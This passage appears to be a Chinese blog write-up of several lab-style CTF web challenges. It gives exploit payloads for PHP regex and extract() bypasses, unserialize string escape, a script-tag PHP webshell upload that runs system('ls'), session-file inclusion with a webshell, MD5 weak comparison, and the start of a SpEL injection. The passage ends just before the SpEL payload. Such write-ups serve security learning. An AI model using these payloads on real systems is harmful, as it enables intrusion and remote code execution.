+<h4 id="usr-local-lib-python3-5-site-packages-flask-app-py"><a href="#usr-local-lib-python3-5-site-packages-flask-app-py" class="headerlink" title="&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.5&#x2F;site-packages&#x2F;flask&#x2F;app.py"></a>&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.5&#x2F;site-packages&#x2F;flask&#x2F;app.py</h4><p>15615647417334</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260406170453432.png" alt="image-20260406170453432"></p>
+<p>c31eea55a29431535ff01de94bdcf5cf</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260406170629428.png" alt="image-20260406170629428"></p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260406170727183.png" alt="image-20260406170727183"></p>
+<p>c31eea55a29431535ff01de94bdcf5cf1f130d751b5f64bcfb4976ea0f5c4761d48c020eb9771281308cafa6b62f92fb</p>
+<h1 id="very-php"><a href="#very-php" class="headerlink" title="very php"></a>very php</h1><p>这里进来就是直接源码，其实这道题难度不是特别高，就是流程·比较多</p>
+<p>我们先来看源码可以发现这里给了我们一个qwq类并且里面的oao方法还会显示config.php的源码，那么这里我们应该能想到config里面肯定是有东西的；</p>
+<p> <img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260406195430191.png" alt="image-20260406195430191"></p>
+<p>然后继续往下走可以看见</p>
+<p>然后就是一个特别长的正则，这里就来到了我们的第一个难点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/^\-[a-e][^a-zA-Z0-8]&lt;b&gt;(.*)&gt;&#123;4&#125;\D*?(abc.*?)p(hp)*\@R(s|r).$/&#x27;, $shaw_root)&amp;&amp; strlen($shaw_root)===29)&#123;</span><br><span class="line">        echo $hint;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;Almost there.&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面就来详细讲一下这里的正则：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">先来看^$,这两个就是开始和结束符的意思</span><br><span class="line">然后就是\-  这个反斜杠不用多说，就是转义，相当于我么拿到字符的第一个必须是-</span><br><span class="line">再看[a-e]，意识就是说我们紧更着-后面的那个字符需要是小写的a-e中的任意一个字符</span><br><span class="line">然后就是[^a-zA-Z0-8]  意思就是下一个字符是非小写也非大写同时也非数字的字符，这里的^表示非</span><br><span class="line">&lt;b&gt;就是规定紧接着的是&lt;b&gt;</span><br><span class="line">(.*)	核心填坑区。 .是任意字符，*是贪婪匹配。  这里我们需要知道小数点其实就是指的匹配任意一个字符的意思</span><br><span class="line">&gt;&#123;4&#125;	&#123;4&#125; 表示精确重复 4 次前面的字符 &gt;</span><br><span class="line">\D*?	\D 是非数字，*? 是非贪婪匹配（能不匹就不匹）。</span><br><span class="line">(abc.*?)	必须以 abc 开头，后面 .*? 能不匹就不匹。</span><br><span class="line">p	绝对匹配，必须是 p。</span><br><span class="line">(hp)*	hp 这个组合可以出现 0 次或无限次。</span><br><span class="line">\@	转义的 @ 符号。	@	1</span><br><span class="line">R	绝对匹配大写 R。	R	1</span><br><span class="line">(s|r)	管道符 `	代表“或”，选s或者r`。	s</span><br><span class="line">.	任意单个字符（不含换行符）。	~	1</span><br><span class="line">$	结束标记，不占字符。	(无)	0</span><br></pre></td></tr></table></figure>
+
+<p>在了解到上述的正则规则的之后我们就直接传参去想办法先拿到hint，这里还要求了我们必须有29个字符，那我们在上面有让我们填充功能的地方塞就可以了</p>
+<p>那么我们第一段payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shaw[root=-a?&lt;b&gt;rrrrr&gt;&gt;&gt;&gt;RabcRphphp@Rrr</span><br></pre></td></tr></table></figure>
+
+<p>我们首先要注意</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str = file_get_contents(&quot;php://input&quot;);</span><br><span class="line">if(preg_match(&#x27;/\`|\_|\.|%|\*|\~|\^|\&#x27;|\&quot;|\;|\(|\)|\]|g|e|l|i|\//is&#x27;,$str))&#123;</span><br><span class="line">    die(&quot;I am sorry but you have to leave.&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    extract($_POST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的php:&#x2F;&#x2F;input伪协议回去读取哦我恶魔女post提交的所有内容，我如果直接拿hackbar串我们的payload</p>
+<p><strong>关键点：</strong> 虽然你用了 <code>[</code> 避开了下划线，但 <strong>Hackbar 这个插件有个“自作聪明”的特性</strong>——它在发送 POST 请求时，为了符合标准的 HTTP 协议，会自动把你输入的 <code>[</code> 变成 <strong><code>%5B</code></strong>。</p>
+<ul>
+<li>一旦变成了 <code>%5B</code>，里面那个 <strong><code>%</code></strong> 符号就立刻命中了黑名单里的 <code>%</code>（正则里有 <code>%</code>）。</li>
+<li>所以你还没等传到 <code>extract</code> 那一步，代码就在 <code>die(&quot;I am sorry but you have to leave.&quot;)</code> 这一行把你踢出去了。</li>
+</ul>
+<p>所以离我们这里就还是需要拿抓包软件直接发包</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260406203025163.png" alt="image-20260406203025163"></p>
+<p>看见了提示，然后题目里面还说我么你要$ans&#x3D;&#x3D;&#x3D;$SecretNumber</p>
+<p>那我们直接去把SecretNumber的值报出来</p>
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import re</span><br><span class="line">a = &#x27;shaw&#x27;</span><br><span class="line">b = &#x27;root&#x27;</span><br><span class="line">for i in range(10000,99999):</span><br><span class="line"> string = a+str(i)+b</span><br><span class="line"> md5 = hashlib.md5(string.encode(&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line"> if(re.findall(&quot;166b47a5cb1ca2431a0edfcef200684f&quot;,md5)):</span><br><span class="line"> print(i)</span><br></pre></td></tr></table></figure>
+
+<p>得出来时21475</p>
+<p><em>***<em>*现在可以使用 call_user_func 函数了， call_user_func 是PHP的内置函数，该函数允许用户调用直接写的函数并传入一定的参数，这里直接调用qwq类中的oao： my[ans&#x3D;qwq::oao**</em>*</em>*</p>
+<p><em>***<em>*显示了config.php的源代码，其中有flag。 最终payload：**</em>*</em>*</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shaw[root=-a?&lt;b&gt;rrrrr&gt;&gt;&gt;&gt;RabcRphphp@Rrr&amp;ans=21475&amp;my[ans=qwq::oao </span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260406203238194.png" alt="image-20260406203238194"></p>
+<h1 id="毒鸡汤"><a href="#毒鸡汤" class="headerlink" title="毒鸡汤"></a>毒鸡汤</h1><p>进入题目之后是这样的，然后瞎点了一下发现还是没啥东西</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260406205446721.png" alt="image-20260406205446721"></p>
+<p>然后拿dirsearch扫出来个hint.txt和<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<p>其实这里直接去<a href="http://www.zip就会下载网站的源文件了：">www.zip就会下载网站的源文件了：</a></p>
+<p>其中hint提示我们flag就在根目录里面，人那后我们去看index.php</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260406205806306.png" alt="image-20260406205806306"></p>
+<p>这里直接就是文件包含：</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260406205436971.png" alt="image-20260406205436971"></p>
+<h1 id="Unserialize-Escape"><a href="#Unserialize-Escape" class="headerlink" title="Unserialize_Escape"></a>Unserialize_Escape</h1><p>进来就是源码：</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260406212112324.png" alt="image-20260406212112324"></p>
+<p>这里的考点其实就是字符串逃逸</p>
+<p> preg_replace(‘&#x2F;x&#x2F;‘, ‘yy’, $string);</p>
+<p>这里就是整个字符串逃逸的核心，这里会在$string里面把所有的x替换成y，这里之所以要写成&#x2F;x&#x2F;是因为preg要求第一个是正则表达式</p>
+<p>往下看就是会把user变成一个数组，然后要求passwd的值为123456，但是上面系统自动就已经赋值了passwd&#x3D;aaaaa了，那这个时候我们就要用字符串逃逸了</p>
+<p>首先我们要知道我们要让php读取肯定是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;i:1;s:6:&quot;123456&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>”；用于和前面本来的序列化数据进行闭合，后面的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i:1;s:6:&quot;123456&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>则是要让php识别为123456才是数组索引为1也就是passwd的值，从而把本来passwd的值挤出去</p>
+<p>那我们数一下发现”;i:1;s:6:”123456”;}的长度为20</p>
+<p>那我们要输入多少个x呢，我们知道一个x会多出一个y，那我们要拼进去是20个字符的”;i:1;s:6:”123456”;}</p>
+<p>那么我们这里就直接输入20个x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">情况 1：少 1 个 x → n=19（失败！）</span><br><span class="line">步骤 1：原始 username</span><br><span class="line">19个x + 20个恶意段</span><br><span class="line">原始长度 = 19+20=39 → 序列化标记：s:39:</span><br><span class="line">步骤 2：过滤后（x 变 yy）</span><br><span class="line">19x → 38y，+20 恶意段 → 总长度 = 38+20=58</span><br><span class="line">过滤后内容：[38个y] + [20个恶意段]</span><br><span class="line">步骤 3：PHP 反序列化（只读 s:39，读 39 个字符）</span><br><span class="line">读前 39 个字符：38个y + 第1个恶意字符</span><br><span class="line">→ 读完截断！</span><br><span class="line">步骤 4：甩出去的内容（剩下的字符）</span><br><span class="line">总长度 58 - 读了 39 = 甩出去 19 个字符</span><br><span class="line">甩出去的是：恶意段后 19 个字符（少 1 个，不完整！）</span><br><span class="line">结果：</span><br><span class="line">甩出去的是残缺的：i:1;s:6:&quot;123456&quot;;&#125;（少开头的&quot;;）</span><br><span class="line">→ PHP 看不懂残缺结构，反序列化失败！</span><br><span class="line">情况 2：正好 x → n=20（成功！）</span><br><span class="line">步骤 1：原始 username</span><br><span class="line">20个x + 20个恶意段</span><br><span class="line">原始长度 = 20+20=40 → 序列化标记：s:40:</span><br><span class="line">步骤 2：过滤后</span><br><span class="line">20x→40y，+20 恶意段 → 总长度 = 60</span><br><span class="line">内容：[40个y] + [20个恶意段]</span><br><span class="line">步骤 3：PHP 只读 s:40（读 40 个 y）</span><br><span class="line">读完截断！</span><br><span class="line">步骤 4：甩出去的内容</span><br><span class="line">60-40=20 个字符 → 正好是完整恶意段：&quot;;i:1;s:6:&quot;123456&quot;;&#125;</span><br><span class="line">结果：</span><br><span class="line">甩出去完整结构，PHP 解析为第二个元素，值 = 123456，成功！</span><br><span class="line">情况 3：多 1 个 x → n=21（失败！）</span><br><span class="line">步骤 1：原始 username</span><br><span class="line">21个x + 20个恶意段</span><br><span class="line">原始长度 = 21+20=41 → 序列化标记：s:41:</span><br><span class="line">步骤 2：过滤后</span><br><span class="line">21x→42y，+20 恶意段 → 总长度 = 62</span><br><span class="line">内容：[42个y] + [20个恶意段]</span><br><span class="line">步骤 3：PHP 只读 s:41（读 41 个字符）</span><br><span class="line">读前 41 个：42个y里的前41个y</span><br><span class="line">步骤 4：甩出去的内容</span><br><span class="line">62-41=21 个字符</span><br><span class="line">甩出去的是：最后1个y + 完整20个恶意段</span><br><span class="line">→ 内容：y&quot;;i:1;s:6:&quot;123456&quot;;&#125;</span><br><span class="line">结果：</span><br><span class="line">开头多了个无用的y，结构变成：y;i:1;s:6:&quot;123456&quot;;&#125;</span><br><span class="line">→ PHP 看不懂带 y 的错误结构，反序列化失败！</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=xxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="自由的文件的上传-script短标签绕过上传一句话木马"><a href="#自由的文件的上传-script短标签绕过上传一句话木马" class="headerlink" title="自由的文件的上传(script短标签绕过上传一句话木马)"></a>自由的文件的上传(script短标签绕过上传一句话木马)</h1><p>进入题目就让我们传文件，然后我们直接传一个最简单的一句话木马发现这里把？替换成了！，那我们这里就不能直接用php标签来写了</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260407161557064.png" alt="image-20260407161557064"></p>
+<p>我们可以使用<script>标签来进行绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;system(&quot;ls&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们直接传上去然后输入对应的url发现没有东西，这就是这道题有点坑的地方，你去点那个小房子就会跳到一个文件包含的页面：</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260407161941390.png" alt="image-20260407161941390"></p>
+<p>既然找到了文件包含的页面那这道题就迎刃而解了</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260407161222056.png" alt="image-20260407161222056"></p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260407161535631.png" alt="image-20260407161535631"></p>
+<h1 id="safe-include"><a href="#safe-include" class="headerlink" title="safe_include"></a>safe_include</h1><p>进入题目直接看见源码：</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260407172221003.png" alt="image-20260407172221003"></p>
+<p>这个一眼就是session文件包含，直接上操作</p>
+<p>先传一个一句话木马给xxs：<br><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260407172330299.png" alt="image-20260407172330299"></p>
+<p>拿着cookie直接去蚁剑里面连，利用xxs参数的文件包含功能：</p>
+<p>/?xxs=/tmp/sess_cookie值</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260407172500932.png" alt="image-20260407172500932"></p>
+<p>当然我一开始找不到sesson的位置在哪里，官方wp里面写的是这是docker容器，那session的储存位置就是在tmp目录下面，其实在题目里面也可以看出来是有在暗示你在tmp里面的而且在大多数linux服务器里面位置其实就是在tmp里面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/:/tmp/&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>一句话解释</p>
+<p>这行代码是<strong>PHP 的安全限制</strong>，作用是：</p>
+<p>**强行锁死 PHP 的文件访问范围，只允许访问 <code>/var/www/html/</code> 和 <code>/tmp/</code> 这两个目录，除此之外的所有目录（如根目录 <code>/</code>、<code>/etc</code>、<code>/root</code> 等）一律禁止访问</p>
+<p><strong><code>ini_set</code></strong>：临时修改 PHP 配置项</p>
+<p><strong><code>open_basedir</code></strong>：PHP 专门用来<strong>限制文件访问目录</strong>的安全配置</p>
+<p><strong><code>/var/www/html/:/tmp/</code></strong></p>
+<ul>
+<li><code>:</code> 是目录分隔符</li>
+<li>允许访问：网站根目录 <code>/var/www/html/</code> + 临时目录 <code>/tmp/</code></li>
+<li><strong>禁止访问：所有其他目录</strong></li>
+</ul>
+<h1 id="你想逃也逃不掉"><a href="#你想逃也逃不掉" class="headerlink" title="你想逃也逃不掉"></a>你想逃也逃不掉</h1><p>进来直接看到源码：</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260407205158886.png" alt="image-20260407205158886"></p>
+<p>这里看见要替换字符然后又要序列化的情况应该马上就会想到字符串逃逸</p>
+<p>知道是字符串逃逸那就直接来构造payload：</p>
+<p>我们这里需要构造的肯定就是索引sign的值为ytyyds，初步来看就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上就是我们要构造的核心目标，但是原本的字符串序列化之后肯定是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:4:&quot;sign&quot;;i:6:&quot;123456&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们要做的就是利用字符串逃逸让sign的值发生改变</p>
+<p>这里哦我恶魔女肯定是要拿name变量一直塞代码然后被替换为空，实现逃逸，但是我们在给passwd传参时是不能直接传</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为当我们利用字符串逃逸时，php肯定会一直往后读，我们直接传sign的值而不管passwd的话这里passswd的值php就读不到了，因为我们明确了肯定是要利用name去吃掉passwd的，但是这个数组明确了是是哪个值来的，那么这里就会报错</p>
+<p>所以我们还要想办法给passwd传，我们传一个admin，那么核心代码就变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:6:&quot;passwd&quot;;s:5:&quot;admin&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>我们为了让php读取username的完整结束，我们机还需要在前面加上;}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:6:&quot;passwd&quot;;s:5:&quot;admin&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这一段的字符串长度是55</p>
+<p>系统会把它装进序列化字符串里，格式大概是这样： <code>...;s:6:&quot;passwd&quot;;s:55:&quot;</code><strong><code>[恶意代码]</code></strong></p>
+<p>黑客知道，<code>username</code> 变空后，会跑出来吃掉它后面的字符，直到吃到我们的恶意代码前面为止。 这段必须被吃掉的“障碍物”是： <strong><code>&quot;;s:6:&quot;passwd&quot;;s:55:&quot;</code></strong></p>
+<p>开始数字符：</p>
+<ul>
+<li><code>&quot;;s:6:&quot;passwd&quot;;</code> 是 15 个字符。</li>
+<li><code>s:55:&quot;</code> 是 6 个字符。</li>
+<li><strong>总计：21 个字符！</strong></li>
+</ul>
+<p>我们需要用题目提供的过滤词（比如 <code>aspx</code> 长度4，<code>gif</code> 长度3）去凑出 <strong>21</strong>。</p>
+<p>虽然 $4x + 3y = 21$ 是有解的（比如 7个 gif 就是 21）。</p>
+<p>但是，这里觉得全用 gif 不够稳，或者他习惯性地想把障碍物凑成一个偶数（比如26）。</p>
+<p>怎么改变障碍物的长度？<strong>在恶意代码的最前面垫几个普通的字母！</strong></p>
+<p>黑客决定在最前面垫上 <code>admin</code> 这 5 个字母。</p>
+<p>恶意代码变成了（也就是你看到的最终 <code>passwd</code> 的值）：</p>
+<p><strong><code>admin&quot;;s:6:&quot;passwd&quot;;s:5:&quot;admin&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;}&quot;</code></strong></p>
+<p>加上这 5 个字母后，这段字符串的总长度变成了 $55 + 5 =$ <strong>60</strong>。</p>
+<p>我们再来看看系统生成的代码变成了什么样：</p>
+<p><code>...;s:6:&quot;passwd&quot;;s:60:&quot;</code><strong><code>admin</code></strong><code>[恶意代码]</code></p>
+<p>现在，<code>username</code> 需要吃掉的“障碍物”也跟着变长了：</p>
+<p><strong><code>&quot;;s:6:&quot;passwd&quot;;s:60:&quot;admin</code></strong></p>
+<p>黑客重新数了一次障碍物的长度：</p>
+<ul>
+<li><code>&quot;;s:6:&quot;passwd&quot;;</code> 是 15 个字符。</li>
+<li><code>s:60:&quot;</code> 是 6 个字符。</li>
+<li><code>admin</code> 是 5 个字符。</li>
+<li><strong>15 + 6 + 5 = 刚好 26 个字符！</strong></li>
+</ul>
+<p>按我们就是要凑26个字符了，简单计算一下就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aspxaspxaspxaspxaspxgifgif</span><br></pre></td></tr></table></figure>
+
+<p>至此我们就够造出来了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?passwd=admin&quot;;s:6:&quot;passwd&quot;;s:5:&quot;admin&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;&#125;&quot;</span><br><span class="line">name=aspxaspxaspxaspxaspxgifgif</span><br></pre></td></tr></table></figure>
+
+<p>这是 <code>unserialize()</code> 拿到的那串字符串： <code>a:3:{s:8:&quot;username&quot;;s:26:&quot;&quot;;s:6:&quot;passwd&quot;;s:60:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:5:&quot;admin&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;}&quot;;s:4:&quot;sign&quot;;s:6:&quot;123456&quot;;}</code></p>
+<p> PHP 引擎开始运行：</p>
+<p><strong>[引擎日志 001]：</strong></p>
+<blockquote>
+<p>读到：<code>a:3:{</code> 脑内活动：好，我要建一个数组（Array）。这个数组里必须有 <strong>3 个元素</strong>。如果不够或者多了，我就抛错。大括号开始，准备接受内容。</p>
+</blockquote>
+<p><strong>[引擎日志 002]（读取第 1 个元素的键）：</strong></p>
+<blockquote>
+<p>读到：<code>s:8:&quot;</code> 脑内活动：接下来的键名是个字符串（String），长度是 8。 读取内容：<code>username</code> （刚好 8 个字符）。 读到：<code>&quot;;</code> 脑内活动：键名读取完毕。接下来准备读它的值。</p>
+</blockquote>
+<p><strong>[引擎日志 003]（读取第 1 个元素的值 —— 案发瞬间！）：</strong></p>
+<blockquote>
+<p>读到：<code>s:26:&quot;</code> 脑内活动：这个值也是个字符串，<strong>长度是 26</strong>。好，我闭上眼睛，往后抓取 26 个字符。 抓取过程（无视任何语法，只数字符数）： 1..2..3.. <code>&quot;;s</code> 4..5..6.. <code>:6:</code> 7.....15.. <code>&quot;passwd&quot;;</code> 16.....21. <code>s:60:&quot;</code> 22.....26. <code>admin</code> 抓取结束。 脑内活动：我抓到了这 26 个字符：<code>&quot;;s:6:&quot;passwd&quot;;s:60:&quot;admin</code>。这就是 <code>username</code> 的值。</p>
+</blockquote>
+<p><strong>[引擎日志 004]（检查第 1 个元素是否合法闭合）：</strong></p>
+<blockquote>
+<p>紧接着抓取的 26 个字符，读到：<code>&quot;;</code> 脑内活动：看到了闭合的双引号和分号，格式完全正确！ <strong>动作</strong>：向数组里写入第 1 个元素：<code>&quot;username&quot; =&gt; &#39;&quot;;s:6:&quot;passwd&quot;;s:60:&quot;admin&#39;</code>。</p>
+</blockquote>
+<p><strong>[引擎日志 005]（读取第 2 个元素的键）：</strong></p>
+<blockquote>
+<p>读到：<code>s:6:&quot;</code> 脑内活动：接下来是第 2 个元素的键名，字符串，长度 6。 读取内容：<code>passwd</code>。 读到：<code>&quot;;</code> 脑内活动：键名读取完毕。</p>
+</blockquote>
+<p><strong>[引擎日志 006]（读取第 2 个元素的值）：</strong></p>
+<blockquote>
+<p>读到：<code>s:5:&quot;</code> 脑内活动：这个值是字符串，长度 5。 读取内容：<code>admin</code>。 读到：<code>&quot;;</code> <strong>动作</strong>：向数组里写入第 2 个元素：<code>&quot;passwd&quot; =&gt; &quot;admin&quot;</code>。</p>
+</blockquote>
+<p><strong>[引擎日志 007]（读取第 3 个元素的键）：</strong></p>
+<blockquote>
+<p>读到：<code>s:4:&quot;</code> 脑内活动：接下来是第 3 个元素的键名，长度 4。 读取内容：<code>sign</code>。 读到：<code>&quot;;</code> 脑内活动：键名读取完毕。</p>
+</blockquote>
+<p><strong>[引擎日志 008]（读取第 3 个元素的值 —— 核心目标达成！）：</strong></p>
+<blockquote>
+<p>读到：<code>s:6:&quot;</code> 脑内活动：这个值是字符串，长度 6。 读取内容：<code>ytyyds</code>。 读到：<code>&quot;;</code> <strong>动作</strong>：向数组里写入第 3 个元素：<code>&quot;sign&quot; =&gt; &quot;ytyyds&quot;</code>。</p>
+</blockquote>
+<p><strong>[引擎日志 009]（检查数组是否结束）：</strong></p>
+<blockquote>
+<p>读到：<code>}</code> 脑内活动：看到了右大括号。让我检查一下契约，最开始说好的数组要有几个元素？ 回忆：<code>a:3</code>。 核对：现在数组里有 <code>username</code>, <code>passwd</code>, <code>sign</code>，刚好 3 个元素！ <strong>结论：数组反序列化完美结束！大功告成！</strong></p>
+</blockquote>
+<p><strong>[引擎日志 010]（处理尾部垃圾）：</strong></p>
+<blockquote>
+<p>引擎：我已经成功完成了任务，把这个完美闭合的数组返回给了 <code>$ans</code> 变量。至于大括号后面那一堆破烂（<code>;s:4:&quot;sign&quot;;s:6:&quot;123456&quot;;}</code>），那是不符合语法的垃圾数据，我直接无视并丢弃。</p>
+</blockquote>
+<h1 id="upload-tutu-md5相同，弱比较"><a href="#upload-tutu-md5相同，弱比较" class="headerlink" title="upload tutu(md5相同，弱比较)"></a>upload tutu(md5相同，弱比较)</h1><p>进入题目是一个文件上传的页面：<br><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260408172309096.png" alt="image-20260408172309096"></p>
+<p>这里还要求我们传两个文件，试了下这里不能传php后缀的，然后我传了两个一样的图片上去就显示文件必须不同</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260408170701808.png" alt="image-20260408170701808"></p>
+<p>然后我又传了两个内容不同的文件上去提示我们md5的值不同，那我们想办法往两个图片里面塞md5值相同的数据就可以了</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260408170636324.png" alt="image-20260408170636324"></p>
+<p>这里使用的是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s155964671a以及s878926199a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260408172532584.png" alt="image-20260408172532584"></p>
+<h1 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h1><p>说实话这道题还是以后强大了再来做吧java好多东西都还没学</p>
+<p>这道题主要就是spel注入 我们打开jar文件就能见</p>
+<p><img src="/images/ctf/polar%E5%9B%B0%E9%9A%BE/image-20260408222415932.png" alt="image-20260408222415932"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(GET)</span><br><span class="line">SPEL/vul?ex=2-1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>页面回显了1，这里存在spel注入了</p>
+<p>直接给payload吧</p>
